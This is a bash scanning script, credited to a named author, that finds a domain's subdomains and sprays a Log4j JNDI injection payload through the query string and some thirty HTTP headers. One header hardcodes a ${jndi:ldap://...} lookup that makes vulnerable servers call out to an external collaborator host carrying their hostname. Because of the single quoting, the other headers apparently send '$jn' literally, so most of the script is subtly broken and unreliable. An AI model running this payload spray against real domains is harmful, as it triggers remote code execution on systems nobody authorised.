#!/bin/bash
#coded by rohit sharma
# Contributers: https://twitter.com/nav1n0x
read -p "Enter domain " sub
read -p "Enter a log4j canary payload: " jn
assetfinder -subs-only $sub | sudo  httpx -path '/?test=$jn'  -H 'X-Api-Version:$jn' -H 'Cookie: mt.v=$jn' -H 'Cookie: CID_CART_COOKIE=$jn' -H 'Cookie: CU_BRAND:$jn' -H 'User-Agent:$jn' -H 'User-Agent:$jn' -H 'Referer:$jn' -H 'Origin:$jn' -H 'Accept-Language:$jn' -H 'X-Forwarded-By:$jn' -H 'X-Forwarded-For: \${jndi:ldap://${hostName}.L4J.zdgnnnz669jsqwlr243a74pk1b72v5ju.oastify.com/a}' -H 'X-Forwarded-For-Original:$jn' -H 'X-Forwarded-Host:$jn' -H 'X-Forwarded-Port:$jn' -H 'X-Forwarded-Proto:$jn' -H 'X-Forwarded-Protocol:$jn' -H 'X-Forwarded-Scheme:$jn' -H 'X-Forwarded-Server:$jn' -H 'X-Forwarded-Ssl:$jn' -H 'X-Forwarder-For:$jn' -H 'X-Forward-For:$jn' -H 'X-Forward-Proto:$jn' -H 'X-Frame-Options:$jn' -H 'X-From:$jn' -H 'X-Geoip-Country:$jn' -H 'X-XSRF-TOKEN:$jn' -H 'Accept:$jn' -H 'Accept-Datetime:$jn' -H 'Accept-Charset:$jn' -H 'Accept-Encoding:$jn' -H 'Accept-Language:$jn'
